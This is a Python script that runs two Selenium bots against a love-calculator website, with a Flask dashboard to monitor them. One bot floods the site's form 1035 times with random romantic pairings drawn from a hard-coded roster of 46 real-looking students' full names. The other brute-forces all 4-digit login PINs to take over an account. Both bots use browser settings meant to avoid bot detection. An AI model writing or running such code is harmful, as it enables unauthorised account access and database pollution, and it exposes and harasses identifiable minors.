# ==============================================================================
# MISSION CONTROL: OPERATION CLASSROOM COVER-UP & ACCOUNT RECOVERY
# CODENAME: DUAL_STRIKE
# VERSION: 4.0.0 (FINAL)
# ==============================================================================

import os
import sys
import time
import random
import logging
import threading
import io
import datetime
import traceback
from flask import Flask, send_file, render_template_string, jsonify

# --- Selenium Imports ---
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# ==============================================================================
# CONFIGURATION & CONSTANTS
# ==============================================================================

# Network Targets
TARGET_POLLUTION_URL = "https://www.getlinks.info/love/c/pvcapru"
TARGET_BREACH_URL = "https://www.getlinks.info/love/loginwithpin.php"

# Operation Parameters
POLLUTION_ITERATIONS = 1035  # As requested
BREACH_PIN_START = 0         # Start from 0000
BREACH_PIN_END = 10000       # End at 9999

# Element Selectors (Based on Source Code Analysis)
SEL_YOURNAME = "yourname"    # ID for user name
SEL_CRUSHNAME = "crushname"  # ID for crush name
SEL_LOGIN_LINK = "nametb"    # ID for link input in login
SEL_LOGIN_PASS = "pwdtb"     # ID for password input
SEL_LOGIN_BTN = "logbtn"     # ID for login button
SEL_ERROR_MSG = "error"      # ID for error message text

# ==============================================================================
# GLOBAL STATE & LOGGING
# ==============================================================================

# Flask App
app = Flask(__name__)

# Shared Mission State (Thread-Safe Dictionary)
mission_state = {
   "pollution": {
       "status": "Initializing System...",
       "current_iter": 0,
       "total_iter": POLLUTION_ITERATIONS,
       "last_pair": "None",
       "screenshot": None,
       "logs": []
   },
   "breach": {
       "status": "Initializing System...",
       "current_pin": "0000",
       "found_pin": None,
       "screenshot": None,
       "logs": []
   }
}

# Custom Logger to feed both Console (Render) and Web UI
class MissionLogger:
   @staticmethod
   def log(system, message):
       """
       Logs a message to stdout (for Render) and the internal state (for UI).
       """
       timestamp = datetime.datetime.now().strftime("%H:%M:%S")
       full_msg = f"[{timestamp}] [{system.upper()}] {message}"
       
       # 1. Print to Console (Render Logs)
       print(full_msg, flush=True)
       
       # 2. Append to UI Logs (Keep last 10 logs to save memory)
       key = "pollution" if system == "pollution" else "breach"
       mission_state[key]["logs"].insert(0, f"[{timestamp}] {message}")
       if len(mission_state[key]["logs"]) > 10:
           mission_state[key]["logs"].pop()

# Names extracted from 'IX B 25-26 (2).pdf'
CLASS_ROSTER = [
   "Aarav Agarwal", "Aarus Kumar", "Aarvi Shailya Patel", "Abhijeet Oraon",
   "Adrija Chatterjee", "Adwitiya Ashok", "Akshita Tripti", "Ananya Sejal",
   "Ananya Sinha", "Ankit Kumar", "Annanya Srivastava", "Anushka Choudhary",
   "Anushka Kedia", "Arnav Gupta", "Arnav Jairaj", "Arnav Shekhar",
   "Atifa Shakeel", "Avyuday Bhagat", "Ayush Kumar", "Bhavna Kumari",
   "Bhavya Mishra", "Chinmay Sharma", "Darshita Vini", "Jahnvi Shree Gaurav",
   "Jaya Shambhavi", "Jayesh Kumar", "Kushagra Bhardwaj", "Lakshya Vishal Bhagat",
   "Mayank Sahu", "Prachi Singh", "Prakhar", "Priyank Oraon", "Reevika",
   "Riddhi Rani", "Rudra Pratap Jha", "Sarthak Raj", "Shashwat Sinha",
   "Shreya Om", "Shreya Raj", "Shreyash Ayush", "Shreyashi Jaiswal",
   "Shuryansh", "Soumya Sinha", "Swarit Oraon", "Tanmay Maheshwari",
   "Vaibhav Raj"
]

# ==============================================================================
# BROWSER INFRASTRUCTURE
# ==============================================================================

def create_stealth_driver():
   """
   Creates a highly configured Headless Chrome instance.
   Optimized for running in Docker/Render environment.
   """
   options = Options()
   
   # Core Headless Settings
   options.add_argument("--headless")
   options.add_argument("--no-sandbox")
   options.add_argument("--disable-dev-shm-usage")
   options.add_argument("--disable-gpu")
   
   # Stealth Settings (To look like a real user)
   options.add_argument("--window-size=1920,1080")
   options.add_argument("--disable-blink-features=AutomationControlled")
   options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
   
   # Suppress Chrome Logs
   options.add_experimental_option('excludeSwitches', ['enable-logging'])
   
   service = Service(ChromeDriverManager().install())
   driver = webdriver.Chrome(service=service, options=options)
   driver.set_page_load_timeout(30)
   return driver

def capture_evidence(driver, system):
   """
   Takes a screenshot and stores it in memory for the dashboard.
   """
   try:
       png_data = driver.get_screenshot_as_png()
       key = "pollution" if system == "pollution" else "breach"
       mission_state[key]["screenshot"] = png_data
   except Exception as e:
       MissionLogger.log(system, f"Screenshot Failed: {str(e)}")

# ==============================================================================
# PROTOCOL ALPHA: DATA POLLUTION BOT
# ==============================================================================

def execute_pollution_protocol():
   """
   The main worker loop for the pollution bot.
   Fills the database with 1035 entries from the class list.
   """
   system = "pollution"
   MissionLogger.log(system, "Booting up Pollution Engine...")
   
   driver = None
   
   try:
       driver = create_stealth_driver()
       MissionLogger.log(system, "Browser Driver Online.")

       for i in range(1, POLLUTION_ITERATIONS + 1):
           mission_state["pollution"]["current_iter"] = i
           
           try:
               # --- Step 1: Navigation ---
               MissionLogger.log(system, f"ITERATION {i}/{POLLUTION_ITERATIONS}: Navigating to target...")
               driver.get(TARGET_POLLUTION_URL)
               
               # Wait for load and clear cookies to ensure a fresh session
               time.sleep(random.uniform(2.0, 3.5))
               driver.delete_all_cookies()
               
               # --- Step 2: Data Generation ---
               name_user = random.choice(CLASS_ROSTER)
               name_crush = random.choice(CLASS_ROSTER)
               
               # Ensure names are different
               while name_user == name_crush:
                   name_crush = random.choice(CLASS_ROSTER)
               
               mission_state["pollution"]["last_pair"] = f"{name_user} + {name_crush}"
               
               # --- Step 3: Form Filling (Name 1) ---
               MissionLogger.log(system, f"Inputting User: {name_user}")
               input_user = driver.find_element(By.ID, SEL_YOURNAME)
               input_user.clear()
               input_user.send_keys(name_user)
               time.sleep(0.2)
               
               # --- Step 4: Gender Selection 1 (Custom Dropdown) ---
               # Finding the first custom dropdown (User Gender)
               # It is usually the first .dropdown class in the form
               try:
                   dropdowns = driver.find_elements(By.CSS_SELECTOR, ".dropdown .select")
                   if len(dropdowns) > 0:
                       dropdowns[0].click() # Open dropdown
                       time.sleep(0.3)
                       # Find options within this specific dropdown
                       parent = dropdowns[0].find_element(By.XPATH, "./..")
                       options = parent.find_elements(By.CSS_SELECTOR, ".dropdown-menu li")
                       if options:
                           random.choice(options).click() # Click random gender
               except Exception as e:
                   MissionLogger.log(system, f"Gender 1 Error: {e}")

               # --- Step 5: Form Filling (Name 2) ---
               MissionLogger.log(system, f"Inputting Crush: {name_crush}")
               input_crush = driver.find_element(By.ID, SEL_CRUSHNAME)
               input_crush.clear()
               input_crush.send_keys(name_crush)
               time.sleep(0.2)
               
               # --- Step 6: Gender Selection 2 (Custom Dropdown) ---
               try:
                   dropdowns = driver.find_elements(By.CSS_SELECTOR, ".dropdown .select")
                   if len(dropdowns) > 1:
                       dropdowns[1].click() # Open dropdown
                       time.sleep(0.3)
                       parent = dropdowns[1].find_element(By.XPATH, "./..")
                       options = parent.find_elements(By.CSS_SELECTOR, ".dropdown-menu li")
                       if options:
                           random.choice(options).click()
               except Exception as e:
                   MissionLogger.log(system, f"Gender 2 Error: {e}")
               
               # Capture filled form
               capture_evidence(driver, system)

               # --- Step 7: Submission ---
               MissionLogger.log(system, "Submitting form data...")
               # Using Enter key on the second input is often more reliable than clicking
               input_crush.send_keys(Keys.RETURN)
               
               # --- Step 8: Confirmation & Cooldown ---
               time.sleep(random.uniform(3.0, 5.0)) # Wait for "Calculating" animation
               capture_evidence(driver, system) # Capture result
               
               MissionLogger.log(system, "Entry Successful. Cooling down...")
               mission_state["pollution"]["status"] = "Cooling Down..."
               
               # Random sleep to mimic human behavior distribution
               time.sleep(random.uniform(2.0, 6.0))

           except Exception as e:
               MissionLogger.log(system, f"CRITICAL ERROR on Iteration {i}: {str(e)}")
               mission_state["pollution"]["status"] = "Recovering from Error..."
               # If browser crashed, recreate it
               try:
                   driver.quit()
               except: pass
               driver = create_stealth_driver()
               time.sleep(5)

   except Exception as e:
       MissionLogger.log(system, f"FATAL SYSTEM FAILURE: {str(e)}")
   finally:
       if driver:
           driver.quit()
       MissionLogger.log(system, "Protocol Alpha Complete. All iterations finished.")
       mission_state["pollution"]["status"] = "MISSION ACCOMPLISHED"

# ==============================================================================
# PROTOCOL BETA: BREACH BOT
# ==============================================================================

def execute_breach_protocol():
   """
   The main worker loop for the breach bot.
   Brute forces PINs from 0000 to 9999.
   """
   system = "breach"
   MissionLogger.log(system, "Booting up Breach Engine...")
   
   driver = None
   
   try:
       driver = create_stealth_driver()
       MissionLogger.log(system, "Breach Browser Online.")
       
       # Load the page once initially
       driver.get(TARGET_BREACH_URL)
       time.sleep(2)

       for pin_int in range(BREACH_PIN_START, BREACH_PIN_END):
           # Format PIN as 4-digit string (e.g., 5 -> "0005")
           current_pin = f"{pin_int:04d}"
           mission_state["breach"]["current_pin"] = current_pin
           
           # Stop if we found it
           if mission_state["breach"]["found_pin"]:
               break
               
           try:
               mission_state["breach"]["status"] = f"Attempting PIN: {current_pin}"
               # MissionLogger.log(system, f"Trying PIN {current_pin}...") 
               # (Commented out logging every single pin to prevent log flooding, will log every 50)
               if pin_int % 50 == 0:
                    MissionLogger.log(system, f"Progress Check: Currently at PIN {current_pin}")

               # --- Step 1: Prepare Fields ---
               # We need to ensure we are on the right page
               if "Login To Love Calculator" not in driver.title:
                   driver.get(TARGET_BREACH_URL)
                   time.sleep(1)

               # Locate elements
               inp_link = driver.find_element(By.ID, SEL_LOGIN_LINK)
               inp_pass = driver.find_element(By.ID, SEL_LOGIN_PASS)
               btn_login = driver.find_element(By.ID, SEL_LOGIN_BTN)
               
               # --- Step 2: Input Data ---
               inp_link.clear()
               inp_link.send_keys(TARGET_POLLUTION_URL) # Enter the target link
               
               inp_pass.clear()
               inp_pass.send_keys(current_pin)
               
               # --- Step 3: Execute Login ---
               btn_login.click()
               
               # --- Step 4: Verification ---
               # The site uses AJAX. We wait a moment for the response.
               time.sleep(0.8) 
               
               # Check for error message
               try:
                   error_elem = driver.find_element(By.ID, SEL_ERROR_MSG)
                   error_text = error_elem.text
               except:
                   error_text = ""

               # Logic: If redirection happens OR "Success" in button OR No error text
               # We check URL first as it's the surest sign of success
               if "/love/" in driver.current_url and "login" not in driver.current_url:
                   # REDIRECTED! SUCCESS!
                   MissionLogger.log(system, f"SUCCESS! PIN FOUND: {current_pin}")
                   mission_state["breach"]["found_pin"] = current_pin
                   mission_state["breach"]["status"] = "BREACH SUCCESSFUL"
                   capture_evidence(driver, system)
                   break
               
               # Check for "Success" text updates in UI
               page_source = driver.page_source
               if "Success" in page_source:
                   MissionLogger.log(system, f"SUCCESS DETECTED! PIN: {current_pin}")
                   mission_state["breach"]["found_pin"] = current_pin
                   mission_state["breach"]["status"] = "BREACH SUCCESSFUL"
                   capture_evidence(driver, system)
                   break
                   
               # Take screenshot every 100 attempts just to monitor
               if pin_int % 100 == 0:
                   capture_evidence(driver, system)

           except Exception as e:
               # If something gets stuck (like an alert or timeout), refresh and retry
               MissionLogger.log(system, f"Error on PIN {current_pin}: {e}")
               try:
                   driver.refresh()
                   time.sleep(2)
               except: pass

   except Exception as e:
        MissionLogger.log(system, f"FATAL BREACH ERROR: {e}")
   finally:
       if driver:
           driver.quit()
       if not mission_state["breach"]["found_pin"]:
           MissionLogger.log(system, "Breach Protocol Finished. No PIN found in range.")
           mission_state["breach"]["status"] = "FAILED - RANGE EXHAUSTED"

# ==============================================================================
# FLASK WEB INTERFACE (MISSION CONTROL)
# ==============================================================================

@app.route('/')
def index():
   html_template = """
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Mission Control: Operation Dual Strike</title>
       <meta http-equiv="refresh" content="3"> <!-- Auto-refresh every 3s -->
       <style>
           :root { --bg: #0f172a; --card: #1e293b; --text: #f1f5f9; --accent: #38bdf8; --danger: #ef4444; --success: #22c55e; }
           body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
           .header { text-align: center; border-bottom: 2px solid var(--accent); padding-bottom: 20px; margin-bottom: 30px; }
           .header h1 { margin: 0; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; }
           .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
           @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
           
           .card { background: var(--card); border: 1px solid #334155; border-radius: 8px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5); }
           .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
           .card-title { font-size: 1.2rem; font-weight: bold; color: var(--accent); }
           .status-badge { background: #334155; padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; }
           
           .stat-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.9rem; }
           .stat-label { color: #94a3b8; }
           .stat-val { font-weight: bold; }
           
           .log-box { background: #000; height: 150px; overflow-y: hidden; padding: 10px; font-size: 0.7rem; color: #33ff00; border: 1px solid #333; margin-top: 15px; }
           .img-box { width: 100%; height: 250px; background: #000; display: flex; align-items: center; justify-content: center; margin-top: 15px; border: 1px solid #444; overflow: hidden; }
           .img-box img { width: 100%; height: auto; }
           
           .progress-bar { width: 100%; height: 6px; background: #334155; margin-top: 10px; border-radius: 3px; }
           .progress-fill { height: 100%; background: var(--accent); border-radius: 3px; transition: width 0.5s; }
           
           .blink { animation: blinker 1.5s linear infinite; color: var(--danger); }
           @keyframes blinker { 50% { opacity: 0; } }
           
           .found-pin { font-size: 2rem; color: var(--success); text-align: center; font-weight: bold; margin: 10px 0; border: 2px dashed var(--success); padding: 10px; }
       </style>
   </head>
   <body>
       <div class="header">
           <h1>Mission Control Center</h1>
           <div style="margin-top: 5px; font-size: 0.8rem; color: #64748b;">OPERATION ID: IX-B-POLLUTION-RECOVERY</div>
       </div>
       
       <div class="grid">
           <!-- POLLUTION CARD -->
           <div class="card">
               <div class="card-header">
                   <span class="card-title">PROTOCOL: POLLUTION</span>
                   <span class="status-badge blink">ACTIVE</span>
               </div>
               <div class="stat-row">
                   <span class="stat-label">Status:</span>
                   <span class="stat-val">{{ p_data.status }}</span>
               </div>
               <div class="stat-row">
                   <span class="stat-label">Progress:</span>
                   <span class="stat-val">{{ p_data.current_iter }} / {{ p_data.total_iter }}</span>
               </div>
               <div class="progress-bar">
                   <div class="progress-fill" style="width: {{ (p_data.current_iter / p_data.total_iter) * 100 }}%"></div>
               </div>
               <div class="stat-row" style="margin-top:10px;">
                   <span class="stat-label">Last Pairing:</span>
                   <span class="stat-val" style="color: #fbbf24">{{ p_data.last_pair }}</span>
               </div>
               
               <div class="img-box">
                   {% if p_has_img %}
                       <img src="/img/pollution" alt="Live View">
                   {% else %}
                       <span style="color:#666">Connecting Visuals...</span>
                   {% endif %}
               </div>
               
               <div class="log-box">
                   {% for log in p_data.logs %}
                       <div>> {{ log }}</div>
                   {% endfor %}
               </div>
           </div>
           
           <!-- BREACH CARD -->
           <div class="card">
               <div class="card-header">
                   <span class="card-title" style="color: #c084fc">PROTOCOL: BREACH</span>
                   {% if b_data.found_pin %}
                       <span class="status-badge" style="background:var(--success)">SUCCESS</span>
                   {% else %}
                       <span class="status-badge">SEARCHING</span>
                   {% endif %}
               </div>
               
               {% if b_data.found_pin %}
                   <div class="found-pin">PIN: {{ b_data.found_pin }}</div>
                   <div style="text-align:center; color: #94a3b8">Access Granted</div>
               {% else %}
                   <div class="stat-row">
                       <span class="stat-label">Status:</span>
                       <span class="stat-val">{{ b_data.status }}</span>
                   </div>
                   <div class="stat-row">
                       <span class="stat-label">Current Attempt:</span>
                       <span class="stat-val" style="font-family:monospace; font-size:1.2rem">{{ b_data.current_pin }}</span>
                   </div>
                   <div class="progress-bar">
                       <div class="progress-fill" style="width: {{ (b_data.current_pin|int / 10000) * 100 }}%; background: #c084fc"></div>
                   </div>
               {% endif %}
               
               <div class="img-box">
                   {% if b_has_img %}
                       <img src="/img/breach" alt="Live View">
                   {% else %}
                       <span style="color:#666">Connecting Visuals...</span>
                   {% endif %}
               </div>
               
               <div class="log-box" style="border-color: #c084fc; color: #e879f9">
                   {% for log in b_data.logs %}
                       <div>> {{ log }}</div>
                   {% endfor %}
               </div>
           </div>
       </div>
   </body>
   </html>
   """
   return render_template_string(html_template, 
                                 p_data=mission_state["pollution"], 
                                 p_has_img=(mission_state["pollution"]["screenshot"] is not None),
                                 b_data=mission_state["breach"],
                                 b_has_img=(mission_state["breach"]["screenshot"] is not None))

@app.route('/img/<system>')
def serve_image(system):
   key = "pollution" if system == "pollution" else "breach"
   img_data = mission_state[key]["screenshot"]
   if img_data:
       return send_file(io.BytesIO(img_data), mimetype='image/png')
   return "No Image", 404

# ==============================================================================
# MAIN ENTRY POINT
# ==============================================================================

if __name__ == "__main__":
   print("===================================================")
   print("   INITIATING OPERATION DUAL STRIKE")
   print("   TARGET 1 (POLLUTION): 1035 Iterations")
   print("   TARGET 2 (BREACH): Range 0000-9999")
   print("===================================================")

   # 1. Start Pollution Bot in Background Thread
   pollution_thread = threading.Thread(target=execute_pollution_protocol, daemon=True)
   pollution_thread.start()
   
   # 2. Start Breach Bot in Background Thread
   breach_thread = threading.Thread(target=execute_breach_protocol, daemon=True)
   breach_thread.start()
   
   # 3. Start Flask Web Server (Blocks Main Thread)
   # Render assigns a port via 'PORT' env variable, defaults to 10000
   port = int(os.environ.get("PORT", 10000))
   app.run(host='0.0.0.0', port=port)